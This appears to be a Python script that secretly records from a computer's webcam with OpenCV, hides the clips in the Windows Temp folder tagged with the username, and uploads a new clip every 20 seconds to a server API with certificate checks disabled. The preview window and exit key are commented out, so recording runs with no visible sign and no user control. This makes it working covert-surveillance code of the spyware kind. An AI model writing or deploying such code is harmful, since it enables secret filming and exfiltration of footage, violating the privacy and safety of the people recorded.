
import cv2
import psutil
import threading
import requests
import urllib3
import os
from datetime import datetime

# removes the future warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# stores the pc user name
userName = psutil.users()[0].name

# path to store the videos in the local pc
storeRootPath = f"C:/Users/{userName}/AppData/Local/Temp/VIDEOS"

# cv2.namedWindow("preview")
capture = cv2.VideoCapture(0)


now = datetime.today()
nowDate = f"D{now.year}-{now.month}-{now.day}_T{now.hour}.{now.minute}.{now.second}"

# creates video obj where we will be writing and saving
fourcc = cv2.VideoWriter_fourcc(*"xvid")
output = cv2.VideoWriter(f"{storeRootPath}/{userName}_{nowDate}_CAM.mp4", fourcc, 10.0, (640, 480))


# send the current video to the server
def SendVideoToSERVER(nowdate):

    global userName

    url = "https://localhost:7056/api/UploadVideo/UploadFiles"
    file = { "videoFile": open(f"{storeRootPath}/{userName}_{nowDate}_CAM.mp4", "rb") }
    params = { "name": userName }
    headers = { "Accept": "application/json" }

    req = requests.post(url= url, params= params, files= file, headers= headers, verify= False)

    print(req.status_code)


# this function will be executed every 20 seconds 
# it executes SendVideoToSERVER() and creates another object for next video
def SecondThread():

    global output
    global nowDate
    global userName
    global fourcc
    global storeRootPath

    # checks if if the above path exists, if not exist? create it
    if(os.path.isdir(storeRootPath) == False):
        os.mkdir(storeRootPath)
        
    else:

        output.release()

        SendVideoToSERVER(nowDate)

        now = datetime.today()
        nowDate = f"D{now.year}-{now.month}-{now.day}_T{now.hour}.{now.minute}.{now.second}"

        output = cv2.VideoWriter(f"{storeRootPath}/{userName}_{nowDate}_CAM.mp4", fourcc, 10.0, (640, 480))

    timer = threading.Timer(20.0, SecondThread)
    timer.start()


SecondThread()


if capture.isOpened():
    ret, frame = capture.read()
else:
    ret = False


try:

    while ret:
    
        #cv2.imshow("preview", frame)
        
        ret, frame = capture.read()

        output.write(frame) 

        # close program when user press ESC
        # key = cv2.waitKey(20)

        # if key == 27:
        #     break

except:

    output.release()

    capture.release()

    #cv2.destroyAllWindows("preview")